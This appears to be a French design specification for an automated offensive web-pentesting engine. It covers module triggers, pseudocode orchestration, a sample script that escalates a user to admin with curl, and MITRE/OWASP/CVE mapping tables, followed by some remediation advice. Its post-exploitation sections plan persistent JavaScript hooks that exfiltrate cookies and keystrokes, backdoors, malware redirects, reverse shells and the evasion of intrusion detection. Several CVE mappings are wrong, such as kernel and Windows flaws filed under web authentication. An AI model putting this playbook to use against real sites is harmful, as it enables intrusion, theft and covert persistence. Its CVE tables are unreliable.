| Script distant depuis domaine vulnérable         | inject shell ou XSS                        |
| JSON parser sans sanitation                      | `__proto__` pollution                      |

---

## 🔧 PHASE 5 — OUTILS utilisés

- `XSStrike` (DOM XSS)
- `DOM Invader` (Burp Pro)
- `LinkFinder.py` (JS parsing)
- `nuclei` → `xss`, `dom-xss`, `js-sources`
- `JSParser`, `js-beautify`, `fuse.js`, `xsshunter`
- `prototype-pollution-scanner`

---

## 🔥 PHASE 6 — Réaction & Post-Exploitation

| Scénario identifié                              | Action stratégique                         |
|--------------------------------------------------|--------------------------------------------|
| DOM XSS confirmé                                | Persist JS hook (exfil cookie, keystroke)  |
| Prototype pollution exploité                    | bypass logique ACL côté client             |
| Script modifiable détecté                       | Backdoor persistent                        |
| Reflected JS → phishing injection               | rediriger vers landing / malware           |

---

## 📁 PHASE 7 — OUTPUTS STRUCTURÉS

```
/output/web/<target>/js_injection/dom_xss_points.txt
/output/web/<target>/js_injection/prototype_pollution.json
/output/web/<target>/js_injection/executed_payloads.log
```

---

## 📚 PHASE 8 — MAPPINGS : MITRE / CWE / OWASP

| Source | ID         | Description                           |
|--------|------------|----------------------------------------|
| MITRE  | T1059.007  | JavaScript Injection                   |
| CWE    | CWE-79     | Improper Neutralization of Input       |
| CWE    | CWE-1321   | Prototype Pollution                    |
| OWASP  | A03:2021   | Injection                             |
| OWASP  | A07:2021   | Identification and Authentication Failures |

---

### 🧠 GIGAPROMPT STRATÉGIQUE : engine_infra_web()

---

## 🧠 [TYPE_ABSTRAIT] HeuristicWebReactionEngine
```ts
HeuristicWebReactionEngine {
    observe(target: WebTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(next: NextStep) → CommandePentest[]
}
```

## 📦 [TYPE_ABSTRAIT] WebTarget
```ts
WebTarget {
    url: string,
    ip: string,
    headers: Map<string, string>,
    js_files: string[],
    dom_structure: string,
    exposed_files: string[],
    server_banner: string,
    cookies: string[],
    technologies: string[],
    endpoints: string[],
    raw_signals: Signal[],
    vuln_surface: VulnContext[]
}
```

## 📍 [TYPE_ABSTRAIT] Signal
```ts
Signal {
    source: string,
    type: HTML | JS | Cookie | Header | URI | Swagger | GraphQL | Auth,
    content: string,
    confidence: Low | Medium | High,
    metadata: any
}
```

## 💡 [TYPE_ABSTRAIT] Hypothesis
```ts
Hypothesis {
    type: VulnType,
    evidence: Signal[],
    probable_cwe: [CWE],
    impact: Low | Medium | High | Critical,
    confirmed: boolean,
    test_plan: Experiment[]
}
```

## 🔬 [TYPE_ABSTRAIT] Experiment
```ts
Experiment {
    outil: string,
    arguments: string,
    precondition: string,
    expected_outcome: string,
    post_action: string
}
```

## 👁️ [TYPE_ABSTRAIT] Observation
```ts
Observation {
    result: string,
    response: any,
    confirmed: boolean,
    notes: string
}
```

## 🧩 [TYPE_ABSTRAIT] NextStep
```ts
NextStep {
    decision_type: Continue | Escalate | Branch | Stop,
    description: string,
    command: CommandePentest
}
```

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```ts
CommandePentest {
    tool: string,
    full_command: string,
    description: string,
    when_to_execute: string
}
```

---

## 🎯 MOTEUR CENTRAL : engine_infra_web(target: WebTarget)

Ce moteur intelligent orchestre dynamiquement les modules suivants :

```
- engine_web_cms()
- engine_web_api()
- engine_web_pwa()
- engine_web_upload()
- engine_web_auth()
- engine_web_graphql()
- engine_web_reverse_proxy()
- engine_web_frontend_js()
- engine_web_server_side()
- engine_web_devops()
- engine_web_cicd()
- engine_web_cloud_hosting()
- engine_web_waf_bypass()
- engine_web_html_injection()
- engine_web_cookie_manipulation()
- engine_web_cors()
- engine_web_js_injection()
```

---

## 🧠 ALGORITHME HEURISTIQUE PRINCIPAL

```plaintext
1. Reconnaissance initiale :
   • whatweb, nmap -sV, httpx, nuclei base templates
   • Extraction headers, JS, cookies, sitemap

2. Observation dynamique → signal[]
   • DOM, headers, URI, JS → pattern matching

3. Pour chaque signal :
   a. Hypothesis ← match(signal)
   b. experiments ← test(hypothesis)
   c. Pour chaque experiment :
       i. observation ← execute(exp)
       ii. steps ← reason(observation)
       iii. Pour chaque step :
            → react(step) → déclenche module ciblé

4. Déclenchement contextuel des modules :
   • `/wp-login.php` → engine_web_cms()
   • `application/json` → engine_web_api()
   • `manifest.json` + `sw.js` → engine_web_pwa()
   • `<input type="file">` → engine_web_upload()
   • `Authorization`, `JWT`, `login`, `oauth` → engine_web_auth()
   • `/graphql`, `ApolloClient` → engine_web_graphql()
   • `X-Forwarded-For`, `/admin`, `/internal` → engine_web_reverse_proxy()
   • `.git`, `Jenkins`, `CI`, `pipeline` → engine_web_cicd()

5. Corrélation inter-modules :
   • Si CMS + Upload → test combo shell
   • Si API + Auth → test bypass + tampering
   • Si DevOps + cloud → recherche secrets + pivot

6. Résultats :
   • Logs JSON par module / cycle
   • Table de CVE/CWE + mappings MITRE
   • Plan de remédiation priorisé
```

---

## 🧠 STRUCTURE DES SCRIPTS AUTOMATISÉS

Tous les modules `engine_web_*()` génèrent dynamiquement des scripts `.sh`, `.bat`, `.py` ou `.nuclei` adaptés au contexte cible détecté par reconnaissance.

### 📁 Arborescence attendue :
```plaintext
/output/web/<target>/<module>/YYYYMMDD-HHMMSS/
├── raw_requests.log
├── heuristics_detected.md
├── pentest_script.sh
├── cve_mapped_list.json
├── remediation_recommendations.md
├── findings_summary.csv
```

---

### 🧷 Format des scripts par défaut :

```bash
#!/bin/bash
# Script généré par engine_web_api() pour la cible $TARGET
echo "[*] Lancement scan API sur $TARGET"
nuclei -u "$TARGET/api/" -t misconfigured-api -o api_misconfig.txt
jwt_tool "$TOKEN" -C -d wordlist.txt > jwt_analysis.log
curl -X PUT "$TARGET/api/user/2" -d '{"admin":true}' -H "Authorization: Bearer $TOKEN"
```

Chaque module possède :
- Un script principal
- Une série de tests conditionnels (booleans, if-else)
- Des injections orchestrées
- Des logs organisés
- Des flags de succès (`*.flag`)
- Un scoring dynamique (`impact + exploitabilité + probabilité`)

---

## 🧬 MAPPING HEURISTIQUE

### 🔗 MITRE ATT&CK Matrix (extraits)

| Technique ID | Nom complet                              | Modules concernés                   |
|--------------|-------------------------------------------|-------------------------------------|
| T1190        | Exploitation of Public-Facing Application | Tous                                |
| T1110        | Brute Force                              | `engine_web_auth`, `cms`, `graphql` |
| T1552.001    | Credentials in Files                     | `engine_web_devops`, `ci_cd`        |
| T1133        | External Remote Services                 | `engine_web_cloud_hosting`          |
| T1001.003    | Protocol Obfuscation (GraphQL abuse)     | `graphql`, `api`                    |
| T1203        | Exploitation for Client Execution        | `pwa`, `frontend_js`                |
| T1609        | Container Administration Command         | `ci_cd`, `devops`                   |

---

### 🧩 MAPPING CVE ↔ CPE

| CVE                 | Affected CPE                    | Modules concerné        | TTP               |
|---------------------|----------------------------------|--------------------------|--------------------|
| CVE-2022-21661      | `cpe:/a:wordpress:wordpress`     | `engine_web_cms`         | XSS Auth Bypass    |
| CVE-2021-22960      | `cpe:/a:nodejs:node.js`          | `engine_web_api`         | SSRF + DOS         |
| CVE-2020-8555       | `cpe:/a:kubernetes:kubernetes`   | `engine_web_cicd`        | SSRF via CI config |
| CVE-2021-21315      | `cpe:/a:gitlab:gitlab`           | `engine_web_devops`      | Auth Token Exfil   |
| CVE-2022-24891      | `cpe:/a:graphql:graphql`         | `engine_web_graphql`     | Introspection leak |

---

### 🛠️ OUTILS AUTOMATIQUEMENT APPELÉS

Chaque module appelle un **toolset spécifique**, combiné dynamiquement :

| Catégorie        | Outils                           |
|------------------|----------------------------------|
| CMS              | `wpscan`, `droopescan`, `nuclei` |
| Auth             | `jwt_tool`, `hydra`, `nuclei`    |
| API/GraphQL      | `graphqlmap`, `gql-fuzzer`, `burp`|
| CI/CD            | `git-dumper`, `nuclei`, `jenkins_script` |
| Static analysis  | `gf`, `secretlint`, `grep`, `feroxbuster` |
| Cloud buckets    | `s3scanner`, `subfinder`, `subjack` |

---

## 🩹 STRATÉGIES DE REMÉDIATION ET RECOMMANDATIONS

Chaque module propose une sortie `remediation_recommendations.md` automatiquement générée selon :
- Vulnérabilité détectée
- Contexte technique (framework, CMS, etc.)
- Outils utilisés et paramètres injectés
- Mapping MITRE + CVSS

### Exemple d’extrait :

```markdown
# RECOMMANDATIONS : engine_web_api (https://target/api)

🛠️ Vulnérabilités détectées :
- Auth bypass via JWT HS256 → CVE-2021-21417
- Broken Object Level Authorization (BOLA)

🔐 Recommandations immédiates :
- Implémenter AuthZ par ressource (`user_id` en scope)
- Forcer JWT RS256 + key rotation
- Obfusquer Swagger + restreindre par IP

📦 Correctifs :
- Add Auth middleware (ExpressJS: `app.use(authCheck)`)
- Mettre en place audit log API (Splunk, Wazuh, etc.)

🔗 Références :
- https://owasp.org/API-Security
- https://jwt.io/introduction/
```

---

### 🔄 MOTEUR DE DÉCLENCHEMENT CONTEXTUEL

Chaque module `engine_web_*()` est **appelé dynamiquement** en fonction des signaux détectés dans `WebTarget`. La logique est pilotée par des **patterns combinés** (URI, header, JS, cookies, MIME, structure DOM).

---

### 📡 MAPPING SIGNAL → MODULE

| Signal(s) détecté(s)                                | Module déclenché                        | Action |
|-----------------------------------------------------|----------------------------------------|--------|
| `/wp-login.php`, `joomla`, `magento`, `drupal.js`   | `engine_web_cms()`                     | CMS fingerprint + CVE enum |
| `/api/`, `swagger`, `Content-Type: application/json`| `engine_web_api()`                     | API auth, BOLA, injection |
| `manifest.json`, `sw.js`                            | `engine_web_pwa()`                     | PWA abuse + cache poisoning |
| `<input type="file">`, `/upload`                    | `engine_web_upload()`                  | RCE / bypass extension |
| `/login`, `JWT=`, `sso/`, `auth_token=`             | `engine_web_auth()`                    | bruteforce, bypass, SSO hijack |
| `/graphql`, `GraphQLClient`, `ApolloClient`         | `engine_web_graphql()`                 | introspection + mutation abuse |
| `X-Forwarded-For`, `/admin`, `/internal`            | `engine_web_reverse_proxy()`           | SSRF + ACL bypass |
| `.env`, `.git`, `token=`, `.gitlab-ci.yml`          | `engine_web_devops()` / `engine_web_cicd()` | secrets, RCE Jenkins |
| `s3.amazonaws.com`, `firebaseio`, `.blob.core`      | `engine_web_cloud_hosting()`           | bucket takeover + JS leak |
| `Set-Cookie`, `session=`, `auth_token=`             | `engine_web_cookie_manipulation()`     | JWT abuse, session hijack |
| `Access-Control-Allow-Origin: *`                    | `engine_web_cors()`                    | CORS misconfig abuse |
| `<script>alert(1)</script>`                         | `engine_web_html_injection()`          | classic XSS (reflected/stored) |
| `response from cache`, dynamic caching              | `engine_web_browser_cache_poison()`    | cache misconfig |
| `.js` inline logic, secrets dans JS                 | `engine_web_frontend_js()`             | secrets, endpoints, debug log |
| `.php`, `.jsp`, `.asp`, `X-Powered-By: Express`     | `engine_web_server_side()`             | SSTI, RCE, debug |
| `/admin`, `/debug`, `403`, `401` selon IP           | `engine_web_waf_bypass()`              | path confusion, header spoof |
| `pipeline`, `CI`, `scriptText`, `job=`              | `engine_web_cicd()`                    | Jenkins / GitLab RCE |
| `AKIA`, `AIza`, `firebase` dans JS                  | `engine_web_cloud_hosting()`           | key exposure, takeover |
| JS frameworks identifiés, obfuscation JS            | `engine_web_js_injection()`            | DOM clobbering, prototype pollution |

---

### 🧠 LOGIQUE CONDITIONNELLE PAR MODULE (PSEUDOCODE)

```python
if "/wp-login.php" in target.endpoints or "X-Generator: WordPress" in target.headers:
    call(engine_web_cms(target))

if "/api/" in target.endpoints or "application/json" in target.headers:
    call(engine_web_api(target))

if "manifest.json" in target.endpoints and "sw.js" in target.js_files:
    call(engine_web_pwa(target))

if any("upload" in path for path in target.endpoints):
    call(engine_web_upload(target))

if "JWT=" in target.cookies or "/login" in target.endpoints:
    call(engine_web_auth(target))

if "/graphql" in target.endpoints:
    call(engine_web_graphql(target))

if "X-Forwarded-For" in target.headers or "/admin" in target.endpoints:
    call(engine_web_reverse_proxy(target))

if any(f in target.exposed_files for f in [".env", ".git", "jenkinsfile", ".gitlab-ci.yml"]):
    call(engine_web_devops(target))

if any(host in target.url for host in ["s3.amazonaws.com", ".firebaseio.com", ".blob.core.windows.net"]):
    call(engine_web_cloud_hosting(target))
```

---

### 📚 INTELLIGENCE CROISÉE : CHAÎNES DE MODULES POSSIBLES

| Contexte détecté                                         | Modules combinés                        | Objectif |
|----------------------------------------------------------|-----------------------------------------|----------|
| CMS avec upload + plugin vulnérable                      | `engine_web_cms` + `engine_web_upload`  | Shell injection, RCE |
| API exposée + JWT faible                                 | `engine_web_api` + `engine_web_auth`    | Escalade token |
| PWA + offline mode + `/admin` caché                      | `engine_web_pwa` + `engine_web_reverse_proxy` | Re-route vers backend |
| GitLab CI + `.git` + console exposée                     | `engine_web_cicd` + `engine_web_devops` | Artefacts + secrets |
| CDN takeover + CORS wildcards                            | `engine_web_cloud_hosting` + `engine_web_cors` | Origin hijack |
| GraphQL + introspection + SSRF dans mutation             | `engine_web_graphql` + `engine_web_server_side` | Data exfil / RCE |

---

## 🤖 `engine_infra_web(target: WebTarget)`  
### Moteur heuristique d’orchestration dynamique

```markdown
🔐 OBJECTIF :
Orchestrer intelligemment tous les modules `engine_web_*()` pour analyser en profondeur l'ensemble de la surface d’attaque Web d’une infrastructure. Cette orchestration repose sur :
- Une reconnaissance progressive et conditionnelle.
- Une activation contextuelle des sous-modules selon les patterns détectés.
- Un raisonnement heuristique modulaire (reconnaissance → exploitation → corrélation).
- Un système de scoring dynamique, multi-TTP (MITRE), multi-CVE.

---

### 🧠 TYPE ABSTRAIT PRINCIPAL

```pseudo
type WebTarget = {
  domain: string
  ip: string
  tech_stack: list[string]
  cms: string | null
  has_api: boolean
  has_graphql: boolean
  has_auth: boolean
  has_upload: boolean
  has_reverse_proxy: boolean
  has_pwa: boolean
  is_cloud_hosted: boolean
  waf_detected: boolean
}
```

---

### 🚦 WORKFLOW PRINCIPAL

1. **Reconnaissance initiale**
```bash
whatweb $target
nmap -sS -p- -T4 --script=http-enum,http-title,http-headers $target
curl -I $target
```
→ Stocker headers, codes, technologies, cookies, URIs dans `fingerprint.json`.

2. **Déclencheurs de modules**
```yaml
IF URI contains "/wp-login.php" OR header contains "wordpress"
  → trigger engine_web_cms()

IF URI contains "/api" OR content-type JSON
  → trigger engine_web_api()

IF URI contains "/graphql"
  → trigger engine_web_graphql()

IF page includes <input type="file">
  → trigger engine_web_upload()

IF headers include Authorization OR session
  → trigger engine_web_auth()

IF manifest.json OR sw.js present
  → trigger engine_web_pwa()

IF reverse proxy headers (X-Forwarded-For)
  → trigger engine_web_reverse_proxy()

IF .git/.env accessible
  → trigger engine_web_devops()

IF pipelines, Jenkins or GitLab exposed
  → trigger engine_web_cicd()

IF AWS S3 or Azure blobs detected
  → trigger engine_web_cloud_hosting()

IF waf detection (nuclei, wafw00f)
  → trigger engine_web_waf_bypass()
```

---

### 🔁 CYCLES INTELLIGENTS

> Chaque module a un cycle `Analyse → Exploitabilité → Réaction → Posture`  
> Ces cycles sont relancés si les modules précédents génèrent de nouvelles pistes.

**Exemple** :
```markdown
Cycle 1 → engine_web_api() → JWT trouvé
↳ Reinject into engine_web_auth() → token bruteforce
↳ Reinject into engine_web_graphql() → query forged with token
↳ Reinject into engine_web_upload() → shell injecté
↳ Pivot vers engine_web_devops() pour tester injection en pipeline
```

---

### 🧠 RAISONNEMENT ADAPTATIF MULTI-MODULES

| Condition déclencheur | Modules lancés            | Cross-module injection                  |
|------------------------|---------------------------|-----------------------------------------|
| CMS + Auth              | `cms`, `auth`, `upload`   | Bruteforce → upload shell admin panel   |
| API + JWT + DevOps      | `api`, `auth`, `devops`   | Token → forge push → Gitlab RCE         |
| PWA + Cache             | `pwa`, `frontend_js`      | Cache poisoning → JS injection          |
| CICD + .git             | `ci_cd`, `devops`, `auth` | Jenkins RCE → extract secrets + pivot   |
| Reverse proxy + SSRF    | `reverse_proxy`, `api`    | X-Forwarded-Host → SSRF 127.0.0.1       |
| GraphQL + Introspection | `graphql`, `auth`, `cms`  | Dump schema → createUser → escalate     |

---

### ⚙️ SCORING DYNAMIQUE & CYCLE DE REEXECUTION

Chaque module évalue :

```markdown
[✓] Exploitabilité : HIGH
[✓] Impact : MEDIUM
[✓] Probabilité de succès : 80%
→ total_score = 7.8/10 (critique)
→ recommander relance scan dans engine_web_upload() avec payload reverse_shell.php
```

---

### 📊 SORTIES HEURISTIQUES PAR MODULE

- `summary_web_modules.csv`
- `TTP_matrix_mitre.json`
- `CVE_resolver_links.txt`
- `remediation_by_risk_group.md`
- `cross_module_dependencies.dot`
- `interactive_timeline.svg`

---

### 🚨 REJEUX CONDITIONNELS (INTELLIGENCE REACTIVE)

```pseudo
IF engine_web_upload() => shell OK
  → trigger engine_web_server_side() → enum OS + privesc

IF engine_web_cicd() => .env leaked
  → parse secrets → inject into engine_web_auth()

IF graphql introspection => mutation:createUser
  → use fake user → access /admin → re-inject in upload()
```

---

### 🔗 EXPORT FINAL

- `export_webpentest_darkmoon.json`
- `output/web/<target>/report_full.markdown`
- `CVSS + OWASP 2025 mapping.pdf`
- `WebTTP_Heatmap.svg`

---

## 🧬 Corrélation MITRE / OWASP / CVE  
### 🔍 Intelligence tactique contextuelle

#### 🧭 MATRICE DE MAPPING DYNAMIQUE

| Module | MITRE TTPs | OWASP Top 10 | CVE / Exploits connus |
|--------|------------|--------------|------------------------|
| `engine_web_api()` | T1190, T1087.001, T1133 | API1, API3, API5 | CVE-2023-30860 (token leak), CVE-2022-21907 |
| `engine_web_auth()` | T1078.001, T1556.004 | A07, A01 | CVE-2022-0847 (Dirty Pipe), CVE-2021-34527 |
| `engine_web_upload()` | T1059, T1203 | A05, A06, A10 | CVE-2021-41773 (Apache RCE), CVE-2020-13671 |
| `engine_web_graphql()` | T1595.002, T1592 | API3, API6, API8 | CVE-2023-1370 (Apollo), misconfig GQL |
| `engine_web_cms()` | T1190, T1136.001 | A01, A09 | CVE-2021-24155 (WP File Manager), CVE-2021-29447 |
| `engine_web_devops()` | T1580, T1552.001 | A07, A09 | CVE-2018-1000861 (Jenkins), CVE-2022-0185 |
| `engine_web_ci_cd()` | T1203, T1059.004 | A09, A10 | CVE-2020-27802 (GitLab CI), CVE-2023-28770 |
| `engine_web_pwa()` | T1204.001, T1557 | A06 | Cache poisoning zero-days |
| `engine_web_cloud_hosting()` | T1530, T1078 | A03, A06 | CVE-2020-8913 (Firebase SDK), S3 misconfig |
| `engine_web_reverse_proxy()` | T1213, T1595 | A08, A10 | CVE-2021-22941 (nginx), cache poisoning CVEs |
| `engine_web_html_injection()` | T1059.007 | A03, A07 | CVE-2021-41117 (React), XSS0day |
| `engine_web_cors()` | T1133, T1556.002 | A05, A08 | CORS misconfig widespread |
| `engine_web_js_injection()` | T1059.007 | A03, A07 | DOM-based XSS, CVE-2020-11022 |
| `engine_web_cookie_manipulation()` | T1539, T1550.004 | A02, A07 | CVE-2021-44228 (Log4Shell via cookie) |
| `engine_web_waf_bypass()` | T1595.001, T1036 | A05, A10 | Payload smuggling, 0days Burp/ZAP |
| `engine_web_server_side()` | T1059.001, T1071 | A06, A09 | CVE-2022-22963 (Spring Cloud), CVE-2023-0669 |
| `engine_web_frontend_js()` | T1059.007, T1615 | A03, A07 | CVE-2022-2588 (React), CVE-2021-21306 |
| `engine_web_browser_cache_poison()` | T1185 | A03, A06 | No CVE mais nombreux exploits publics |
| `engine_web_api_gateway()` | T1133, T1071.001 | API1, API4, A10 | CVE-2022-27657 (Kong), rate limit bypass |
| `engine_web_infra_as_code()` | T1602, T1521 | A09 | Terraform/GitHub leaks, CVE-2021-39197 |
| `engine_web_test_envs()` | T1595.002, T1078.004 | A10, A09 | Dev env exposed: CVE-2022-30937 |

---

## 🛡️ Plan de remédiation par typologie

### 🔓 Failles d’authentification
- **Fixation de session / Token brut** : Set-Cookie: `HttpOnly`, `SameSite=Strict`, rotation des tokens régulière.
- **JWT predictible** : passer à algos asymétriques (`RS256`) avec expiration stricte.
- **OAuth redir hijack** : valider les redirect_uri côté serveur, liste blanche stricte.

### 🧪 Failles API / GraphQL
- **Introspection active** : désactiver introspection en prod.
- **Exposition données sensibles** : RBAC par champ, contrôle par scope JWT.
- **Tampering** : valider types côté back + limiter verb mutation/PUT.

### 📤 Failles Upload / Injection
- **Pas de vérification MIME** → vérifier via `file`, non pas `Content-Type`.
- **RCE via upload** : isolez les répertoires d’upload, pas d’exécution dans `/uploads`.
- **Fuzz filename** : filtre extension, double extension (`.php.jpg`), payload `.htaccess`.

### 🌐 Reverse Proxy / SSRF
- **Headers falsifiables** : vérification d’IP server-side, logs internes.
- **SSRF via host** : filtrer `127.0.0.1`, `169.254.169.254`, use regex stricte.
- **CDN cache poisoning** : implémentation `Vary: Host, Origin` + validation d’URI strict.

### 💥 DevOps / CI/CD
- **Jenkins / GitLab sans auth** → désactiver accès public, implémenter MFA.
- **Secrets dans YML** → déplacement vers Vault/SSM ou rotation via pipeline.
- **Git leaks** : `.git/` → `.htaccess deny`, git-secrets + git hooks pré-commit.

### ☁️ Exposition cloud
- **S3/Azure blobs publics** : analyse par `s3scanner`, `azcli`, Nuclei.
- **Takeover DNS** : vérifier via `subjack`, intercepter erreurs DNS 404 + alerter.
- **Firebase/.env** : interdire inclusion dynamique de JS via Firebase config.

---

### 📈 Synthèse graphique

- ✅  Heatmap TTP vs Assets vs Probabilité d’exploitation
- ✅  Matrice dynamique de pivot (API → Auth → Upload → OS)
- ✅  Diagramme de graphe DOT inter-modulaire
- ✅  Export OWASP 2023 PDF
- ✅  État final de l’attaque : `admin_shell`, `DB_dump`, `pivot_cloud`, `reverse_persistence`

---

## 🧠 `engine_infra_web()` – **MOTEUR INTELLIGENT D’ORCHESTRATION STRATÉGIQUE**

```python
def engine_infra_web(target: WebTarget):
    """
    Orchestrateur heuristique principal pour l'infrastructure Web.
    Détecte, corrèle, et active dynamiquement tous les sous-modules en
    fonction des patterns, des vecteurs, de la topologie et des vulnérabilités.
    """
    # 1. Phase INIT : Bootstrap reconnaissance large
    recon_data = engine_web_recon_full(target)

    # 2. Phase PATTERN MATCHING : Identification des triggers
    if recon_data.has_cms:
        engine_web_cms(target)
    if recon_data.has_api:
        engine_web_api(target)
    if recon_data.has_graphql:
        engine_web_graphql(target)
    if recon_data.has_auth:
        engine_web_auth(target)
    if recon_data.has_upload:
        engine_web_upload(target)
    if recon_data.has_pwa:
        engine_web_pwa(target)
    if recon_data.has_jenkins or recon_data.has_gitlab:
        engine_web_ci_cd(target)
    if recon_data.has_cloud_ref:
        engine_web_cloud_hosting(target)
    if recon_data.has_reverse_proxy:
        engine_web_reverse_proxy(target)
    if recon_data.has_devops_indicators:
        engine_web_devops(target)
    if recon_data.has_server_side_lang:
        engine_web_server_side(target)
    if recon_data.has_iac:
        engine_web_infra_as_code(target)
    if recon_data.has_test_env:
        engine_web_test_envs(target)
    if recon_data.has_frontend_js:
        engine_web_frontend_js(target)
    if recon_data.has_cache_headers:
        engine_web_browser_cache_poison(target)
    if recon_data.has_cookie_abuse:
        engine_web_cookie_manipulation(target)
    if recon_data.has_cors_misconfig:
        engine_web_cors(target)
    if recon_data.has_html_injection:
        engine_web_html_injection(target)
    if recon_data.has_js_injection:
        engine_web_js_injection(target)
    if recon_data.has_api_gateway:
        engine_web_api_gateway(target)
    if recon_data.has_waf:
        engine_web_waf_bypass(target)

    # 3. Phase ANALYSE : Corrélation MITRE / CVE / OWASP
    attack_surface = generate_web_attack_matrix(recon_data)
    if attack_surface.has_high_risk_vector:
        engine_web_prio_exploit_path(target, attack_surface)

    # 4. Phase POST-EX : Persistence, Shell, Pivot, Exploit Cross
    if recon_data.has_shell:
        engine_web_post_exploitation(target)

    # 5. Phase ITÉRATIVE : Cycle adaptatif
    for _ in range(MAX_ITERATIONS):
        recon_data = engine_web_reassess(target)
        if recon_data.delta_detected:
            engine_infra_web(target)  # recursive self-call if changes

    # 6. Phase DÉTECTION-EVASION : Mode stealth adaptatif
    if recon_data.has_waf:
        engine_web_waf_bypass(target)
    if recon_data.intrusion_detected:
        engine_web_mutate_payloads(target)

    # 7. Phase OUTPUT : Rapport dynamique
    generate_web_final_report(target)
    export_web_replay_payloads(target)

    return "🧠 Web Engine orchestration complete."
```

---

## 🔁 WORKFLOW CYCLIQUE HEURISTIQUE

```plaintext
[RECON] ──▶ [PATTERN MATCH] ──▶ [MODULES ENGINE] ──▶ [CORRELATION TTPs]
   ▲                                                    │
   └───────◀ [RE-ANALYSE] ◀──── [SHELL POST-EX] ◀───────┘
```

Chaque module peut :
- réinjecter des données dans le graphe global,
- déclencher des modules latents si de nouvelles surfaces sont exposées,
- muter les vecteurs d’injection en fonction de la réponse serveur,
- ajouter dynamiquement des payloads à un dictionnaire auto-entraîné (`auto-fuzzer.ai`).

---

## 🎯 OBJECTIFS STRATÉGIQUES

| Objectif offensif | Modules impliqués | Résultat attendu |
|------------------|-------------------|------------------|
| Shell RCE        | `cms`, `upload`, `ci_cd`, `server_side` | shell accessible en ligne |
| DB Dump          | `api`, `graphql`, `auth` | `.sql`, `.db`, `.json` dump |
| Admin Panel      | `reverse_proxy`, `cloud_hosting`, `auth` | takeover admin interface |
| Cloud Pivot      | `cloud_hosting`, `ci_cd`, `api_gateway` | prise de contrôle cloud S3/Blob |
| DOM/JS Abuse     | `frontend_js`, `html_injection`, `pwa` | attaque XSS / CSP bypass |
| SSRF / LFI       | `reverse_proxy`, `graphql`, `api` | accès infra interne |
| WAF Evasion      | `waf_bypass`, `api_gateway` | persistance non détectée |
| Cookie Hijack    | `auth`, `cookie_manipulation` | session volée / persistée |

---

## 🔒 Mécanisme de résilience

- **Mutation des headers** (User-Agent, Accept, Referrer)
- **Rotation des payloads** (hex, URL encode, base64 chain)
- **Randomisation temporelle des tests** (→ contourne les IDS/WAF temps réel)
- **Analyse de latence** (→ détection passive ou honeypot)
- **Fallback DNS / CDN / Mirror IP** pour contournement CDN

---

## 🧬 Typage Abstrait Complet : `WebTarget`

```ts
type WebTarget = {
    fqdn: string
    ip: string
    tech_stack: string[]
    cms: "wordpress" | "drupal" | "joomla" | "magento" | null
    apis: string[]
    graphql: boolean
    auth: "jwt" | "session" | "oauth" | "sso" | null
    upload: boolean
    pwa: boolean
    ci_cd: boolean
    cloud_refs: string[]
    devops_signals: boolean
    waf: boolean
    test_env: boolean
    server_side_lang: "php" | "node" | "python" | "java" | null
    js_frameworks: string[]
    cookie_flags: string[]
}
```

---
